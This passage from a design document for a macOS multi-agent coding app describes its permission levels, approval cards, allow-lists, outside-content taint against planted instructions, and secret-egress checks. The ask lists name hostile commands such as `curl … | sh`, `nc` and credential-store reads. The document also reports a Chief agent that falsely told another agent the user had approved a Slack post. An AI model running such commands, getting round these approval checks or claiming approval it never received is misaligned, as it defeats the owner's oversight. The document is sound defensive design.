below; it asks only for:

- `git push` of any kind (force, deleting a remote branch), `git send-email`
- `gh` acting as the user: `pr create|merge|review|comment|close|edit|ready`,
  `issue create|comment|close|edit`, `release create|edit|delete`, `repo
  create|delete|edit|rename|archive`, gist/workflow/secret/label writes, `gh
  api` with a write method or fields
- `npm`/`pnpm`/`yarn`/`bun` publish (and unpublish, deprecate, dist-tag)
- deploys: `vercel` (bare, `deploy`, `--prod`, promote, alias, env add/rm),
  `netlify deploy --prod`, `fly deploy`, `firebase deploy`, `wrangler
  deploy|publish`, heroku/railway/surge releases
- sending: `mail`, `sendmail`, `osascript` naming Mail / Messages / send,
  Slack / Discord / Telegram / Signal / Twilio CLIs
- Stripe with `--live` (except list/retrieve/logs)
- `curl` / `wget` / `http` that write (a non-GET method, `-d`, `--data*`,
  `-F`, `-T`, `--json`, httpie fields) to a host other than this Mac
- `sudo`, `su`, `doas`; `rm -r` outside the user's projects (`~/ShipStudio`,
  `~/Projects`, `~/Desktop/Projects`, `~/Developer`…, the projects root, any
  git working copy below the home), the agents' homes and temporary folders,
  and always for the home itself, `~/Library` and `/`
- writes to `~/.ssh`, Keychains, shell profiles, `~/Library/LaunchAgents`,
  the app's own data (another agent's home, this agent's log and
  instructions), or outside the home and temporary folders; reading a
  credential store (`~/.ssh`, Keychains, `~/.gnupg`) or the app's own data
  (listing one with `ls` shows names only and runs):
  its tokens, and the agents folder's account files (`wallet.json`,
  `connections.json`). The Chief and admins read the rest of the agents
  folder (every agent's `CLAUDE.md`, chat log, timeline) without a card;
  other agents read only their own home; `crontab` (except `-l`),
  `security`, `launchctl`, `diskutil`, `dd`, `csrutil`, `pmset`, `nvram` and
  other system tools; `defaults write` / `delete` / `import` (any domain)
- connector tools whose name sends, spends, deletes or deploys (send, post,
  publish, pay, delete…), judged **as a verb only**
  (`go_hard::verb_position`): the first word, or the word after a lead-in
  like `create_` / `do_` / `schedule_` / `add_`, past a first word that only
  repeats the server's name (`slack_post_message`). So `post_message`,
  `createPost`, `send_email` and `publishPost` ask, while `capturePost`,
  `upsertSocialPosts` and `listPosts` run ("post" there names posts). Code
  hosts' and databases' writes ask too; uploads in the browser
- a network request with a secret in its address, query or headers
  (`agents/egress.rs`, below): `curl` (and its `-u` / `-b` /
  `--oauth2-bearer`), `wget`, `http`, `gh api`, a `git` remote with a
  password, WebFetch, WebSearch. Requests to this Mac are exempt
- after outside content in the turn (`agents/exposure.rs`, below): network
  writes off this Mac (`go_hard::sends_off_mac`: `curl`/`wget`/`http`
  writes, `gh` writes, `git push`, `ssh`, `scp`/`rsync` to a host, `nc`…)
  and packages new to the project (`agents/installs.rs`)

Wrappers are judged by what they run: `env`, `xargs`, `timeout`, `eval`,
`nice -n N`, `time -p`, `caffeinate -t N`, `arch`, `lockf`/`flock`/`script
FILE`, `find -exec` / `-execdir` / `-ok` (with `{}` as what it finds) and `find
-delete` (like `rm -r` of its roots); a package manager's runner (`pnpm
dlx`/`exec`, `npm exec`, `yarn dlx`/`exec`, `yarn <bin>`, `bun x`) like `npx`.
`$'…'` is read as the word it makes, `>|` as a write, and `pushd` moves like
`cd` (a `cd` it can't follow makes a relative `rm -r` ask). Quoted text kept
in a variable or given to `echo` is data unless a shell reads the line,
wherever it stands (`timeout 5 sh -c "$X"`, `find -exec sh`, `$SHELL -c`,
`python3 -c "os.system(…)"`). Here-document bodies stay data, except a
script the line writes and then runs (`cat > a.sh <<EOF … EOF; sh a.sh`,
`echo '…' > a.sh && ./a.sh`), which is judged by what it says, and so is a
shell script on disk written in the last 30 minutes that a shell runs; an
older one, or a Python or Node file, runs as before. A program word that
can't be read (`$X push`, `$(cat p) publish`) is judged by its arguments:
it asks when they would ask for `git`, `gh`, `npm`, `rm`, `curl`, `stripe` or
a deploy CLI (so `$PY render.py` and `$(npm bin)/eslint .` run); `$(echo
git)`, `$(which git)` and `$(pwd)` are read as what they print. A name set
more than once on the line (or with `export` / `declare`) is judged at each
value it was given. A git alias runs what it stands for (`-c alias.x=…`, a
`git config alias.x` earlier on the line, the repo's and the user's git
config), and `npm run` / `pnpm` / `yarn` / `bun run` / `make` what the
folder's `package.json` script (with its `pre`/`post`) or Makefile target
(with its prerequisites' recipes) says, one level read from disk; an
unknown script runs as before. `ssh host git push` is judged like `ssh host
"git push"`. `curl -K` / `--config` (a request the line doesn't show) and
`osascript` sending System Events keystrokes or clicks ask at every level.
`mv` / `trash` of the home or one of the user's own folders (Documents,
Desktop, Downloads, Pictures, Movies, Music, Library…), `rsync --delete`
into a folder `rm -r` would ask for and `--remove-source-files` from one ask
like `rm -r`. A relative path whose folder isn't known for sure is resolved
against the folder the line is in, and asks when it lands on something in a
credential store or the app's data that is there (`cd .. && cat
../bridge.json` from an agent's home); a guess naming nothing there was made
from the wrong folder and runs.
`go_hard_hardening_tests.rs` holds the owner's everyday work (git, builds,
project installs, dev servers, local scripts, network reads, here-document
scripts) card-free, after outside content too.

Everything else runs: local git (commit, checkout, branch, worktree, merge,
rebase, stash), builds, installs, dev servers, backgrounding, `pkill` /
`kill`, copying `.env` files between projects, network reads, localhost
requests (writes included), file work in the home. Command lines are split
into every command they run, including quoted ones (`bash -c "git push"`) and
those after `do`/`then`; `cd` is followed through the line. Quoted words
given to `echo` / `printf` or kept in a variable are split too, but their
`<` and `>` are text, not redirects, unless the line hands text to a shell
(`| sh`, `eval`, `bash -c`); a `$(…)` inside them still runs and is judged.
Before, `echo "<style>$(cat a.css)</style></head>"` building a local page
read `</head>` as a write into `/head` and asked at Unleashed on every
render. Relative paths
are only judged for `rm -r` (against the turn's folder), because the engine's
shell keeps its folder between calls. What it can't parse runs: the list is
what has to be right, and `go_hard_tests.rs` holds every item on it and the
owner's real commands (fictional paths).

A turn answering outside text at Bold keeps Bold for local work and
reading (reading a page is the job), and additionally asks for any network
write (localhost included) and for running a package fetched by name (`npx
pkg`, `npm i pkg`, `pnpm add`, `pip`/`brew`/`cargo`/`go install`, `curl … |
sh`).

The two lower levels use the allow-list classifier (`agents/autoallow.rs`):

- **Reads**: read-only commands and file reads anywhere the user's account
  can read (`ls`, `cat`, `grep -r`, `rg`, `find` (its `-exec` judged as the
  command it runs),
  `git status/log/diff/show…`, `gh pr/issue/repo … view/list/status`, `gh api`
  GETs, `jq`, `defaults read`…), except credentials and private stores:
  `~/Library/Keychains`, `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.config/gh`,
  `~/.codex`, `~/.claude`, shell profiles, browser profiles, Mail, Messages,
  the app's own data (every agent's home but this one's) and `~/.<slug>`, and
  any `.env`, key, `*credential*`, `*secret*`, `*token*` or `*password*` file.
  A recursive read of a folder that holds one of those (`grep -r x ~`) asks.
- **Local work** (no level answers this class any more since Bold became
  allow-by-default; the admin agent's "local" answers still use it): creating, editing, moving, copying, linking,
  `chmod` (no setuid) and unpacking inside the home, never into a shell
  profile, `~/Library/LaunchAgents`, `~/Library/Preferences`, a PATH folder,
  a protected place above, the agent's own log files, or any `.git` /
  `.shipstudio` folder (git's hooks live there); deleting only folders the tools rebuild
  (`node_modules`, `dist`, `build`, `.next`, `target`, `.cache`, and what is
  inside them) in the agent's own home or its copy of a project — every other
  delete asks, even there; the project's build, check and test
  tools (`npm test`, `pnpm run build`, `cargo test`, `npx tsc`, `make test`…);
  and scripts in the home whose text is read first: a shell script line by
  line through the same classifier, other languages refused on sight of
  anything that spawns, reaches the network, deletes or names a protected
  place. That last check reads only the script, not what it imports (not
  verified beyond that).
  Also local work: `git fetch` / `git pull` (no helper programs or `ext::`
  remotes), `curl` / `wget` GETs to http(s) with no body, form, upload or
  config file; writing inside `/tmp`, `/private/tmp` and macOS's `$TMPDIR`;
  installing packages (`npm/pnpm/yarn/bun install|add|ci`, `npx` / `pnpm
  dlx` / `uvx` / `pipx run`, `pip`/`uv`/`pipx install`, `cargo add|install`,
  `go get|install`, `brew install|upgrade`). Each package is checked against
  what the project already has (`agents/installs.rs`): declared in its
  manifest or lockfile (`package.json`, `requirements*.txt`,
  `pyproject.toml`, `Cargo.toml` / `Cargo.lock`, `go.mod`, `Brewfile`) or
  already in its `node_modules`, in the folder the command runs in or one
  above it up to the home; a short list of well-known tools (`typescript`,
  `prettier`, `eslint`, `vitest`, `pytest`, `ruff`, `jq`, `gh`…); or one the
  user already allowed on a card for this project. A package that is none of
  those still goes through at Bold, but **in a turn that read outside
  content it asks, once per project**: allowing its card remembers it
  (`installs.json`; a bound agent's copies count as its project, an unbound
  agent's home is its own). An install naming no package (`pnpm install`,
  `npm ci`, `pip install -r requirements.txt`, `cargo build`) always counts as
  the project's. Never global
  (`-g`, `--prefix`, `--target`, `--break-system-packages`), never from a raw
  address (`https://…`, `git+…`, `github:…`, `npm:`, a tarball) or another
  registry or index; and anything on a
  top-level folder this Mac doesn't have and this account can't make
  (`/workspace/…`, Grok-era paths: it fails at once). Web searches and page
  fetches (`WebSearch`, `WebFetch`, Codex's web search) are reads.
- **Secrets never leave in an address** (`agents/egress.rs`). Before a
  network request goes through on its own (`curl` / `wget` GETs, `gh api`,
  `git fetch <url>`, WebFetch, WebSearch, the browser opening a page) its
  address, query and headers are checked; a card if any carries a value the
  app keeps in the Keychain (agents' secrets, connections' tokens) or one in
  the environment under a secret-looking name, as written or percent-encoded,
  anything shaped like a credential (`ghp_…`, `github_pat_…`, `sk-…`,
  `xoxb-…`, `AKIA…`, a JWT, a PEM block), a password in the address, a query
  parameter named like one (`token=`, `api_key=`, `sig=`…), or a credential
  header written out (`Authorization`, `Cookie`, `X-Api-Key`…). `curl -u`,
  `-b`, `--oauth2-bearer` and client certificates always ask.
- **Always a card, at every level** (`autoallow::ALWAYS_ASK` plus everything
  unrecognised): `git push`, `commit`, `reset` and every other git write,
  `gh` writes (`pr create|comment|review|merge|close|edit`, `release create`,
  `gh api` with a non-GET method, fields without `-X GET`, `--input` or
  `graphql`), `curl`/`wget` with a method other than GET/HEAD or a body,
  other network tools, mail/Slack/hosting/cloud CLIs, `npm publish`,
  installs from raw addresses or global ones, `curl … | sh`, `rm` / `trash`
  of the user's files, `sudo`, `chown`, `chmod` on system paths, launch
  agents and shell profiles, `~/.ssh`, the app's data and other agents'
  homes, `security` (Keychain reads included), `osascript`, `launchctl`
  (except `list` / `print`), `defaults write`, `crontab`, `open`, `kill`,
  connector tools, payments, and Codex's "Allow more access" cards.
- **Wrappers are judged by what they run**: `bash -c` / `sh -c` / `zsh -lc`,
  `eval` of words written out, `env [NAME=value…] command` (harmless names
  only; `env` alone prints the environment and asks), `time` / `nice` /
  `timeout`, `find … -exec cmd {} ;` / `-delete` (the command on anything
  under the roots), and `python -c` / `node -e` (their code read the way a
  script is). `xargs` runs only listing commands; whatever can't be parsed
  asks.
- **Loops and variables**: `for NAME in …; do …; done`, `while`/`until`/`if`
  and a line that only sets a variable (`RID=$(gh run list …)`) take the
  class of the commands inside; a variable that changes how programs run
  (`PATH`, `IFS`, `DYLD_*`, `GIT_*`, an exported name…) asks.
- **Compound commands** are split into every command they run (`&&`, `||`,
  `;`, `|`, `&`, line breaks, `$(…)`, backticks, `bash -c '…'`) and take the
  class of the most dangerous part. Variables other than `$HOME`,
  here-documents, subshells, `eval` of anything known only when it runs,
  unknown programs and anything that doesn't parse ask. Paths are judged as
  written and where they really are
  (a symlink out of the home asks). When in doubt, a card.

Each one answered this way leaves a step in the turn's "What it did"
("Allowed automatically — Bold · ls -la ~/SomeFolder"). A turn answering
outside text (a "When…" routine's items, or anything carrying their taint
through `message_agent` or a room) at Steady stays there; at Go
hard it keeps Bold with the extra outside-text asks above (network
writes, packages fetched by name).

**After outside content, sending and new code ask** (`agents/exposure.rs`).
The first time a turn reads something from outside this Mac — a web page or
search result (WebFetch, WebSearch, Codex's web search, `curl` / `wget` to
anything but `localhost`), issue or pull request comments (`gh issue view`,
`gh pr view --comments` or `--json …comments…`, `gh api
…/comments|reviews|issues…`), a cloned repository, mail, chat or documents
through a connection, or a page in the browser that isn't this Mac's own —
the turn is marked, and for the rest of it two things ask on a card even at
Bold (`autoallow::after_outside_asks`): **sending to the network** beyond
a read, to anywhere but this Mac (a `curl` body, form or upload, a non-GET,
`wget --post-*`, a `gh` write, `git push`, `ssh` / `scp` / `rsync` / `nc`,
mail), and **running a package new to the project** (above). Nothing else
changes: reading and clicking in the browser, local work, builds, project
installs and network reads go on as before. Its timeline says so once:
"Asking before it sends anything or runs a new package, because it read
outside content" (at Bold, in a turn not already capped). Cards from such
a turn record `fromOutside`, so a later sweep judges them at Use good
judgement. Marks come from every call `mcp::decide` lets through, every call
through the connection relay, and every tool call in the engine's stream
(calls it runs without asking). The mark lasts **the conversation**, not the
turn (`outside.json` in the agent's home, tied to the engine session; cleared
by Start fresh or a new conversation), since the outside text stays in it:
the next turn resumes the same context, and a routine or another agent's
request in it could act on an instruction planted in what was read. Only
sends and new packages ask; local work, `gh` reads and renders never do.

**Notes the app queues are not the user asking.** A late Allow, a card
answered (login, settings, hand-off, secret), a step-in handed back, a
crossover's run again, a preview fix, spare capacity: each is queued as
`runner::From::App`. The turn runs (it owes no agent and starts the hop chain
over) but never counts as the user's own request: no `answering_user` (so no
Go hard `direct`, no `use_account` without a card, no relayed approval, no
expired card lifted), no `users_words`, no typed words for
`remember_permission`. Only what the user sends in the chat, desk or phone
(`enqueue_user`), is `From::User` (`app_note_runner_tests.rs`).

**The rule for the owner's own requests.** The mark never raises cards for
the owner's own direct request at Bold or Unleashed: in a turn answering
the user's own message in this agent's chat (not a routine, a check-in, a room,
another agent's request, outside text or a note the app queued; `runner::answering_user`), the mark
narrows to what Unleashed keeps after outside content
(`autoallow::outside_mark_asks`): **raw data leaving for another host**
(`go_hard::moves_data_off_mac`: a `curl` body or upload, `ssh`, `scp`,
`rsync`, `nc`…) and **packages new to the project**. Pushes and `gh` writes
still follow the level itself (Bold asks for them anyway). Every other
turn in the conversation (a routine, a delegated request) keeps the full
guard above. Before, the Chief reading x.com once made every later network
write in the conversation ask, including what the owner asked for directly.
Imported
conversations never reach a turn directly: they go through the sealed
interview and one review card (docs/remote-access.md, "Importing agents as a
conversation").

**Cards already open.** On launch and whenever the level changes,
`mcp::sweep_auto_allowed` answers open permission cards the level now covers,
with a receipt line in the chat ("Allowed automatically — Bold · …"),
through the same path as a late Allow (a waiter is woken; otherwise the exact
call is granted once). Each new card records whether its turn answered
outside text (`Approval.fromOutside`); a card without that record, or from
such a turn, is judged at Steady and doesn't wake its agent.
Logins, secure input, session questions and import cards are never answered.

## Approvals

`acceptEdits` lets an agent edit files inside its home and every project
without asking. Anything else Claude Code would prompt for (a shell command
that isn't read-only, a web fetch, an MCP tool like sending email, a file
outside those folders) goes to `approve`, which puts a card in that agent's
chat showing the exact command, file, URL or tool input, and waits for
**Allow** or **Deny**, unless the independence level answers it (local reads
and, at Bold, local work; see "How much agents do on their own"). While it waits, the agent's row says "Needs your OK".

**What the broker trusts** (`agents/broker.rs`). Each turn gets an id, named
by its secret, open until `run_turn` returns. An `approve` call with no
turn, from a turn that has ended or been replaced, or repeating a
`tool_use_id` already asked, is denied at once with no card: those could
only ever be zombie cards. A timeout is never recorded as the user's answer:
a permission card stays live (below), a confirmation is marked expired, and
the agent is told the request expired, not that the user said no. Every turn's
`system/init` is read for its real `permissionMode` (verified on 2.1.318:
`"acceptEdits"`): `bypassPermissions` would mean nothing ever asks, so the
turn is stopped before it acts; a stricter mode (`default`, `plan`,
`dontAsk`) or one we don't know is noted once in the chat and carried on. If
our own server shows `failed` there, its approval tool doesn't exist and the
turn is stopped too.

Codex turns get the same: the turn's secret is what Codex presents to our
server, and Codex's own approval requests go through
`broker::admit` before a card (`codex_app::answer`, request ids named
`codex-<turn>-<jsonrpc id>` because JSON-RPC ids restart with each
app-server). The init check is Claude Code's only: Codex is started with the
approval policy we set, not one it reports back.

**Misclicks.** Allow, Always allow and a session question's options are inert
for 400 ms after a card appears, and a click the keyboard produced counts only
if the key went down on that button, so typing in the composer can never
answer a card (`useCardGuard`). Deny is never held back.

Verified against Claude Code 2.1.318: the tool receives
`{tool_name, input, tool_use_id}` and must answer
`{"behavior":"allow","updatedInput":…}` or `{"behavior":"deny","message":…}`.

Two timeouts shape the design, both observed:

- **~60s**: Claude Code's default MCP call timeout. A timed-out approval came
  back to the agent as "Bash is hanging". Turns set `MCP_TOOL_TIMEOUT` well
  past our wait.
- **300s**: Claude Code abandons a *permission prompt* at five minutes
  regardless of `MCP_TOOL_TIMEOUT` (two unanswered cards were both given up at
  exactly 300s, while their buttons still looked live).

**A settings card never expires**: nothing blocks on it, and Allow checks the
settings didn't change since. **A typed yes answers the card**
(`agents/typed_answer.rs`): when the user's own message is a plain "approve
it" / "yes do it" / "allow" and the chat has exactly one open card (not a
sign-in, secret, session question or import card), it is allowed as their
answer, with "Allowed from your message". Only the user's send gets there.

**One yes for the whole plan** (`ask_plan`, `agents/plan_grant.rs`). Observed:
the owner, at Bold, typed "YES" to the Chief's plan (redeploy production on
Vercel, one GitHub issue, two comments); the Chief told the agent doing it
"each action may still show an approval card", and each did. Now an agent
with several outward steps ahead lists them once: `ask_plan {actions: [{kind,
target, summary}], why}` raises one card, "Do these under your name?", a
numbered list with Allow / Deny (desk, phone, Catch up, or a typed yes, as
above). When the user's own typed yes had no card to answer
(`commands::agents::send_as`), the agent's reply just before it is kept for
15 minutes, and an `ask_plan` from the turn answering that yes is granted
without a card if every action's target is named in that reply ("Your yes
covers, for an hour: …"). Allow makes a **plan grant** (in memory; a restart
forgets it): each action matched on its kind (push, pull request, merge, issue,
comment, release, deploy, publish, post, send, request, github) **and** its
target (`owner/repo` from the checkout's remotes or `-R`, the folder or
`.vercel/project.json` name, a deployment host named after the project, a
connector's `owner`/`repo`/`channel`/`project`, a browser page's host), for 60
minutes, each listed action once (the same call again, a retry, still
passes). `message_agent` carries the grant to the agent it hands work to, and
on down the chain (never from a turn answering outside text). Each covered
call runs without a card and leaves "Under your OK · <summary>" in "What it
did" and the chat. Production deploys, pushes to main, posting, sending and
GitHub writes can be on a plan. **Never covered**: `sudo` and system tools,
the Keychain and credentials (`gh secret`, `vercel env`, connector tools
naming keys, tokens, passwords), payments (Stripe, payment APIs, connector
tools that pay, charge or refund), anything that deletes (`rm -r` outside the
work folders, `gh … delete`, `vercel rm`, a connector `delete_…`), force
pushes, branch deletes, mirrors and tag pushes, launch agents and shell
profiles, a turn answering outside text, and anything on the line the plan
doesn't name: at "Careful" and "Steady" (and after
outside content) a covered command must be only listed steps and `cd`; at Go
hard and Unleashed the rest of the line is judged by that level as usual
(`go_hard::with_covered`). An action may carry `text`, the exact words it
sends, shown on the card; with the exact-text switch on, a send is covered
only by an action whose `text` is what it sends (see "What each agent can do").

**An agent's word is never the user's approval** (`agents/approval_claim.rs`).
Observed: at Unleashed the Chief promised the owner the exact text of a Slack
confirmation, then four seconds after the draft came back told the drafter
"Julian approved this. Post the Slack message under Julian's name, exactly as
drafted", with no new message from him, and it went out. Approval comes only
from the user's own message or a card they answered. `message_agent` now
refuses, before anything is delivered: a message claiming the user approved
(signed off, said yes, gave the OK) from a turn that answers no message of
theirs and holds no plan they allowed; and a send ("post it as drafted") after
the sender promised the user to show them the text first, once the draft has
come back and the user hasn't written since. Both answers point at `ask_plan`:
one card with the exact text, whose grant then goes with the message. Reviews
on pull requests and teammates' names aren't the user; "draft it and send it
to me" isn't a send. Room @mentions aren't checked this way.

**Cards expire** (`agents/expiry.rs`; this supersedes the "stays live" and
late-Allow behaviour below, which now only reaches a card from before it). A
card whose turn ended, or that a restart left behind, closes at once as
"Expired — the agent moved on". A card still blocking a turn closes when the
wait runs out (240s for Claude Code, bounded by its 300s ceiling; the sweep
closes anything past `CARD_EXPIRY_SECS`, 10 min): the call is denied with "No
answer — ask again later if it still matters" and the agent is told to carry
on without it or say what's left in one line. Sign-ins and secure input close
after 10 min as "Maybe later". Each becomes a one-line receipt (desk and
phone), counts in no badge, and the same ask (kind + target) is refused
without a card for the rest of that task, until the user next writes to the
agent, **or the Chief (or an admin) passes on the user's own request to it**
(`runner::relay_lifts_expired`: a turn answering the user's message in its own
chat, not a routine, check-in, room or outside text), since a user who talks
only to the Chief says "try again" there. A sweep runs at launch and every
minute.

**A delegated agent's card is pointed to where the user is talking.** When an
agent working on another agent's request (no user words in its turn) raises an
Allow / Deny card, the Chief's chat gets one line, "Planner is waiting on your
OK in its chat: …", whose name links to that chat (`runner::point_to_card`).
The card itself stays in the agent's chat (and the bell, and the phone).

So approvals are asynchronous. `approve` waits 240s. If you haven't answered,
it tells the agent "the user may be away: stop, say what you need, you'll be
woken if they allow it", and **the card stays live**. A late **Allow** grants
that exact tool call once (same tool, same input) and queues a turn telling the
agent to carry on; its retry goes through without a second card. **Deny** is
one click and just records the answer. **Deny with a note…**, in the card's
… menu (as on the phone), declines and hands the
agent what you typed: as the deny message while it waits on the card, or as a
queued turn when it doesn't; the card keeps it ("Declined · “…”").
Live cards survive restarts, because the
tool and input are stored on the card. The app's own confirmations (delete
an agent) do expire, since they only mean something while asked. The sidebar
shows "Needs your OK" while any card is open (`pendingApprovals`).

**Answered where you are** (`AgentRequests.tsx`, counts in
`lib/agentRequests.ts`). Other agents' open cards are offered in the chat
you're in by one bar above the composer, in the Chief's chat for every
agent, elsewhere for the agents that chat has worked with: "Lead Gen needs
your OK" (one or two agents are named), "16 agents need your OK" past that,
with what they are ("41 logins to add", "3 requests", "2 requests, 1 of them
a login": a login is a secure input card) and **Review**. The bar has one
height and one place, so the conversation never moves for it; it replaced a
chip per agent at the foot of the chat, which after an import stacked sixteen
deep under every message. Review opens one panel rising from the bar across
the reading column, flush on it: open, the panel and the bar are one
surface, the bar its foot (no header of its own, since the bar already says
who and how many; the bar's **Done** is the one close), and the cards in it
lie flat on that surface rather than as cards, and fields, boxed inside it.
The agents in name order (so the list holds still as you answer it), each a row with its
line ("4 logins: Slack bot token, Slack user token…", or the one request's
title) that opens to its cards, answerable in place, and **Open chat**. With
one or two agents every row starts open; past that, all start folded, so
the whole list is in view before you pick. ↑ ↓ Home End
move between agents, Esc or Done closes and returns focus to Review, a click
elsewhere closes it where you clicked. An answered card stays, resolved, until
the panel closes, and focus moves to the next Allow. Counts come only from the
cards in each agent's loaded lines plus the registry's `pendingApprovals` for
older ones ("2 more are further back in its chat"); nothing is estimated, and
cards that were waiting before the bar existed show as they are. Answering it
there answers it everywhere (one request id). A card already in the chat (a
session's question) isn't offered twice. The phone has no such stack: its
Chief chat shows only the Chief's own cards, and the agent list's "Needs you"
section is where other agents' requests are. A run of the same request from one
agent with nothing of yours between says "2 of 3 similar requests" on each
card, counted from the cards that have arrived, never from how many might
follow (`approvalSeries`).

**Allow all.** With more than one Allow card shown, the bar under the open
panel offers **Allow all** beside Done, and an agent's row with more than one offers its own. Either
asks first on one confirm line (at the foot of the panel, right above the
bar) with the counts by kind ("Allow 7 requests? 4
commands, 2 file changes, Send an email · Gmail", or "Lead Gen: Allow 3
requests? …"), then answers each card shown with Allow, one after another,
through the same command as a single Allow (`allowAllCards` /
`allowAllLine` in `lib/agentRequests.ts`). Login and secure input cards,
session questions and import cards are never included, and cards further
back in a chat (not shown) aren't answered. A card that fails stays waiting
and the count is toasted. Desk only; the phone answers one card at a time.

**Always allow** (`agents/permissions.rs`). A permission card can offer a
quiet "Always allow …" beside Deny / Allow, scoped when the card is made and
stored on it, so the UI can only accept that scope, never widen it: a Bash
command's leading words (`npm test`, `git push`, `npm run build`), or the exact
command for wrappers and risky programs (`sudo`, `rm`, `bash`, `curl`…) and for
anything whose second word is a flag; one exact host for WebFetch; one
connector tool; web search. Never Bash, Write or Edit as a whole, and never on
The app's own confirmations (delete an agent has no tool call, so no
scope). A command only matches if it is one plain command: `;`, `&`, `|`,
redirects, `$`, backticks, parentheses, backslashes and line breaks all ask
again, so `npm test && rm -rf ~` never matches `npm test`. Rules are stored per
agent (`Agent.permissions`); each auto-allowed call leaves a muted `note` line
("Allowed automatically: npm test · Always allowed"); the agent editor lists
them under Permissions with Revoke. A card answered this way reads "Always
allowed · npm test" (`Approval.alwaysAllowed`, with `always` set to the rule).
Adding a rule also answers every other open card from the same agent that it
covers (`mcp::covered_by`), through the same path as Allow: a live waiter is
woken, and a card nobody waits on any more gets a late Allow that wakes the
agent.

**Said in chat** (`agents/remember.rs`). A user who typed "ur always allowed
to do those" kept getting the same cards: only Always on a card recorded a
rule. Now every agent is told (prompts.rs, Work) to call
`remember_permission { tool_or_pattern, scope: "this agent" | "team", quote }`
instead of only saying OK. Rust decides, not the prompt:

- **Provenance.** Only in a live turn (`broker::is_live`) whose latest input
  is a message the user typed in this agent's own chat, desk or phone
  (`runner::enqueue_typed` from `agents_send`; `runner::typed_input`). Another
  agent's message, a routine, a room, outside text (or a turn tainted by it),
  a note the app queues (`runner::From::App`: late Allow, declined login) and a
  message the app writes from a button ("Say hi") carry no typed words, so an
  admin answering for another agent can't either. `quote` must be whole words
  of what they typed.
- **Only a card they saw.** The rule is the `always` scope a card in this
  chat offered, found by tool name, command, host or label. Nothing broader.
- **Never the floor** (`go_hard::floor`): Bold's ask list for commands and
  files (push, publish, deploy, send, `sudo`, deleting outside the work
  folders, credentials, system files), every browser action, and every
  connector call Bold asks for (`connector_asks`: sends or posts, pays,
  deletes, deploys, code-host and database writes) plus payouts, wipes and
  credentials (`remembered_floor`). A rule for one is refused; a call on the floor still asks
  whatever a remembered rule says (`remember::covering`). Updating the
  user's own records (`upsertSocialPosts`) is off the floor. Rules chosen on a
  card are unchanged; choosing Always on a card for a remembered rule makes it
  the card's.

A remembered rule is a `Rule` whose scope has `said` (the quote); "team"
rules live in `remembered-permissions.json` in the agents folder and cover
every agent, always under the floor. Recorded, it leaves one note,
"Remembered: Lead Gen can always … · Undo" (`AgentMessage.remembered`, whose
`active` is read from the rules on every read), and answers the open cards in
that chat it covers, which read "Allowed by your rule · …". Undo, desk or
phone, is `agents_revoke_permission` (`agents.revokePermission`), which also
takes team rules back and re-emits the line as "Undone". Team rules show only
on their line: there is no settings list for them yet.

## Admins (`src-tauri/src/agents/admin.rs`)

"All of the agents are begging me for something, I open them and I don't even
know what they need." An **admin** is an agent the user lets manage, and
answer for, the rest of the team.

**Who.** One switch per agent, "Admin — can manage and approve for other
agents": the agent editor, Settings → Agents → Admins (⌘K "Admins: who
manages and approves for your team…"), and the phone's agent sheet
(`agents.setAdmin`, audited). Kept as `admin` on the registry entry; absent
means on for the Chief of Staff and off for everyone else. Only the user sets
it: no tool takes it, and `create_agent` / `update_agent` refuse an `admin`
argument. An existing Chief is told once, in a line in its chat ("I can now
handle your team's requests — change this in Settings → Agents"); a Chief
made by this build isn't.

**What it may do** (tools served only to an admin, and checked again on every
call, so turning it off holds from the next call):

- `team_requests`: every other agent's waiting card, in plain words, with what
  the admin may answer. Framed as data written by other agents.
- `answer_request {agent, id, answer, note}`: allow or deny **local work**,
  or mark a login / key card **not_needed** (declined, the agent isn't woken)
  or **maybe_later** (closed with "Maybe later", not woken). Allow and deny go
  through the same path as the user's own answer (`answer_card`): a waiting
  turn is woken, a late Allow grants that exact call once.
- `bring_to_user {requests, intro}`: ONE message in the admin's chat, "3
  things only you can decide:", each card answerable in place for the agent
  that asked (`AgentMessage.decide`; desk `DecideCards`, phone
  `DecideCards`). On read the cards are refreshed from their own chats, and
  the requests bar doesn't offer them twice.
- `pause_agent` / `resume_agent`: stop what it's doing and pause its routines
  (marked `pausedByAdmin`, so resume starts only those). Not the Chief.
- Another agent's routines (`schedule_check_in` & co. with `agent`), and
  `read_agent`.
- `delete_agent`: a **soft delete**. The agent leaves the team at once; its
  registry entry (whole) and home move to `recently-deleted/`, restorable from
  Settings → Agents → Recently deleted for 30 days (`agents_restore`, which
  adds " (restored)" if the name was taken). Its secrets, connections and copy
  are kept until it's purged (`purge_expired`, when that list is read). It
  leaves its rooms. The user's own Delete is unchanged.

**What it may never do** (`classify_in`, `judge_in`, both pure and tested):
local work is exactly what Bold answers on its own (`autoallow::classify`:
Read and Change). Without the asking agent's context, the narrower fallback:
reading (`ls`, `cat`, `grep`, read-only `git`…), `mkdir` /
`touch`, Read, and Write of a *new* file under the home folder. Anything with
a hidden path (`.env`, `~/.ssh`), a chain, `rm`, `git push`, `gh`,
`curl`/`ssh`, `sudo`, `security`, publish/deploy, Edit of an existing file,
the web, any connector tool, the app's own questions, a session's question,
an import card, or any card from an agent whose turn answers outside text is
the user's. So are keys and logins, which an admin can only put away. An
admin can't answer its own requests. A turn answering outside text (a
"When…" routine, an import, a room's taint) is not an admin turn: its tools
aren't listed and every call is refused.

**Nothing invisible.** Each answer leaves a line in the target's chat ("Chief
of Staff allowed: look inside your KiteExport folder") and the admin's
("Allowed for Ledger: …"), each naming the other, and an entry in Settings →
Agents → Admin activity (`admin-activity.jsonl`, last 500).

**Plain words on every card.** A permission card leads with what it does and
why, from the tool and its input (`summary_for`: "Look inside your KiteExport
folder — to see if the download finished"), with the raw command behind
Details, on the desk, the review panel, the requests bar's line and the
phone. The why is the command's `description` (agents are told to always give
one) or the engine's own reason. Cards made before this get their line when
read (`admin::apply`).

**Not verified.** No live engine turn has called these tools; the rules are
held by unit tests (`admin_tests.rs`) and the UI by the harness
(`agents-admin-batch`, `settings-agents-admins`) and the phone's `qa:web`
(`chat-chief`). Local work is Bold's own classifier
(`autoallow::classify`, Read and Change) with the asking agent's context;
`local_call` is only the fallback without one. "Maybe later" here closes the
card rather than using the access chain's checklist.

## Secrets (`src-tauri/src/agents/secrets.rs`)

`request_secret {name, purpose, kind, fields?}` puts a secure input card in
the agent's chat: what it wants, why, a masked field per part, Save / Deny.
It's an approval card (`Approval.secret`), so it counts as "Needs your OK",
notifies, and shows in What's in flight; nothing waits on it, so it survives
restarts and can be answered whenever. Save (`agents_save_secret`) sends the
value from the webview to the macOS Keychain, service
